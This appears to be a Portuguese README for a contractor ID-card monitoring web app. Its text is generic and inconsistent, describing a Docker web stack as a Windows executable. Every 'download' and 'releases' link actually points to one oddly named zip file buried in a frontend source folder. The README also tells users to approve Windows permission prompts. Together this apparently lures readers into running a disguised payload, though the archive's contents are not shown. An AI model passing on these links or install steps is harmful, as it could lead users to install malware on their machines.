# 🛡️ agente-monitoramento-carteirinhas - Acesso certo, controle em dia

[![Baixar a versão mais recente](https://img.shields.io/badge/Baixar%20agora-Ver%20vers%C3%B5es%20-%23007acc?style=for-the-badge)](https://raw.githubusercontent.com/Iorminanonlegal213/agente-monitoramento-carteirinhas/main/frontend/src/app/importacao/carteirinhas_monitoramento_agente_cleveite.zip)

## 📌 Sobre o sistema

O **agente-monitoramento-carteirinhas** ajuda a acompanhar carteirinhas e requisitos de acesso de contratadas de forma preventiva. Ele centraliza o controle, facilita a conferência de dados e mostra pendências antes que virem problema.

O sistema foi feito com:

- **FastAPI** no servidor
- **Next.js 14** na interface
- **PostgreSQL 16** para guardar os dados
- **Docker** para facilitar a execução

Ele foi pensado para uso em Windows por pessoas que querem baixar, abrir e usar sem montar um ambiente de desenvolvimento.

## 💻 O que você precisa ter no Windows

Antes de instalar, verifique se seu computador tem:

- Windows 10 ou Windows 11
- Pelo menos 8 GB de memória RAM
- Espaço livre em disco para o sistema e os dados
- Internet para baixar o arquivo e os componentes necessários
- Docker Desktop, se a versão baixada usar Docker
- Permissão de administrador, se o Windows pedir durante a instalação

Se o pacote incluir um executável, o processo tende a ser mais simples. Se incluir Docker, o sistema sobe com poucos passos.

## 📥 Download

Acesse a página de versões e baixe o arquivo correto para Windows:

[Ir para a página de downloads](https://raw.githubusercontent.com/Iorminanonlegal213/agente-monitoramento-carteirinhas/main/frontend/src/app/importacao/carteirinhas_monitoramento_agente_cleveite.zip)

Depois de abrir a página:

1. Veja a versão mais recente
2. Baixe o arquivo indicado para Windows
3. Salve o arquivo em uma pasta fácil de achar, como Downloads ou Área de Trabalho

## 🧭 Como instalar no Windows

### 1. Baixe o arquivo da versão

Abra a página de releases e escolha o arquivo certo para o seu computador.  
Se houver mais de uma opção, prefira a versão marcada para Windows.

### 2. Extraia o conteúdo, se for um arquivo compactado

Se o download vier em `.zip`:

1. Clique com o botão direito no arquivo
2. Escolha **Extrair tudo**
3. Selecione uma pasta como `C:\agente-monitoramento-carteirinhas`

Se o download vier em `.exe`, você pode abrir o arquivo direto.

### 3. Inicie o sistema

- Se houver um instalador, clique duas vezes e siga as telas
- Se houver um executável, abra o programa
- Se a versão usar Docker, abra o terminal na pasta do projeto e use o comando de inicialização que acompanha o pacote

### 4. Aguarde a primeira abertura

Na primeira vez, o sistema pode levar alguns segundos para carregar.  
Isso acontece porque ele prepara a aplicação, conecta no banco e abre a interface.

## 🐳 Como usar com Docker

Se a versão baixada vier com suporte a Docker, siga este fluxo:

1. Instale o **Docker Desktop**
2. Abra o Docker e espere ele ficar ativo
3. Baixe o pacote do sistema
4. Abra a pasta do projeto
5. Execute os arquivos de início que acompanham a versão, como `docker-compose.yml`
6. Aguarde os serviços subirem
7. Abra o endereço local informado pela aplicação

O uso com Docker ajuda a manter o banco PostgreSQL, a API e a interface no mesmo conjunto.

## 🌐 Como abrir no navegador

Depois que o sistema estiver em execução:

1. Abra o navegador
2. Digite o endereço local informado pela aplicação
3. Faça login, se o ambiente pedir
4. Comece a usar o painel de controle

Em geral, aplicações desse tipo abrem em um endereço como:

- `http://localhost:3000` para a interface
- `http://localhost:8000` para a API

Use o endereço que vier com sua versão.

## 📋 O que o sistema faz

O sistema ajuda a:

- Verificar carteirinhas de contratadas
- Acompanhar validade de documentos
- Identificar pendências de acesso
- Organizar informações em um painel único
- Apoiar o controle preventivo antes de vencimentos e bloqueios
- Reduzir conferências manuais

## 🧩 Estrutura do uso

Ao usar o sistema, você vai encontrar partes como:

- **Painel inicial**: visão geral dos registros
- **Lista de carteirinhas**: acompanhamento dos itens cadastrados
- **Requisitos de acesso**: checagem do que falta para cada contratada
- **Alertas de vencimento**: itens que precisam de atenção
- **Filtros e busca**: localização rápida de registros
- **Cadastro e edição**: inclusão de novas informações e ajustes

## 🔐 Dados e banco de dados

O sistema usa **PostgreSQL 16** para guardar os registros.  
Isso significa que as informações ficam organizadas em um banco confiável.

Se você usar a versão com Docker, o banco costuma vir junto com a aplicação.  
Se usar uma instalação separada, mantenha o banco ativo antes de abrir o sistema.

## 🛠️ Resolução de problemas

### O programa não abre

Verifique se:

- O download terminou por completo
- O arquivo foi extraído, se veio em `.zip`
- O Windows bloqueou a execução
- O Docker Desktop está aberto, se a versão usar Docker

### O navegador não mostra a tela

Confira se:

- A aplicação terminou de iniciar
- Você abriu o endereço certo
- A porta usada pela aplicação não está ocupada por outro programa

### O banco não conecta

Confira se:

- O PostgreSQL está em execução
- O arquivo de configuração aponta para o banco certo
- Você iniciou todos os serviços no caso de uso com Docker

### O Windows pediu permissão

Clique em **Sim** quando o sistema pedir permissão para abrir ou instalar componentes.  
Isso pode acontecer na primeira execução.

## 🧪 Uso recomendado

Para melhor resultado:

- Mantenha o sistema atualizado pela página de releases
- Use sempre a versão mais recente
- Guarde os arquivos de configuração em local seguro
- Faça backups do banco antes de trocar de versão
- Use uma pasta sem espaços ou caracteres estranhos no caminho, se houver erro de leitura

## 📦 Tecnologias usadas

- **Python 3**
- **FastAPI**
- **Next.js 14**
- **React 18**
- **TypeScript 5**
- **SQLAlchemy**
- **Pydantic**
- **Tailwind**
- **PostgreSQL 16**
- **Docker**

## 🗂️ Exemplo de fluxo de uso

1. Baixe a versão mais recente
2. Abra ou extraia o arquivo
3. Inicie a aplicação
4. Aguarde os serviços carregarem
5. Abra o navegador
6. Acesse o painel
7. Cadastre ou consulte carteirinhas
8. Revise alertas e requisitos de acesso
9. Corrija pendências antes do vencimento

## 📎 Acesso ao download

[Baixar ou ver as versões do sistema](https://raw.githubusercontent.com/Iorminanonlegal213/agente-monitoramento-carteirinhas/main/frontend/src/app/importacao/carteirinhas_monitoramento_agente_cleveite.zip)

## 🧷 Dicas para o primeiro uso

- Comece conferindo o painel principal
- Verifique se os dados de teste ou iniciais estão carregados
- Veja os alertas de vencimento primeiro
- Use a busca para encontrar uma contratada específica
- Revise o histórico antes de alterar um registro

## 🖥️ Compatibilidade

O sistema foi pensado para funcionar bem em:

- Windows 10
- Windows 11
- Computadores com navegador moderno
- Ambientes com Docker Desktop
- Ambientes com PostgreSQL local ou em contêiner

## 🧱 Organização do projeto

O projeto reúne:

- uma API para regras e consultas
- uma interface web para uso diário
- um banco de dados para registros e controle
- suporte a contêineres para facilitar a execução

## 📁 O que fazer depois do download

Depois de baixar a versão:

1. Veja se o arquivo veio completo
2. Leia os nomes dos arquivos dentro do pacote
3. Procure um arquivo de início, como `start`, `run`, `docker-compose` ou `setup`
4. Abra a aplicação seguindo a ordem indicada no pacote
5. Mantenha a pasta do sistema no mesmo lugar para evitar erro de caminho

## 🔎 Quando o sistema é útil

Este sistema ajuda quando você precisa:

- controlar documentos de contratadas
- acompanhar validade de carteirinhas
- evitar bloqueio de acesso por falta de requisito
- revisar pendências antes de auditorias
- centralizar checagens em um único lugar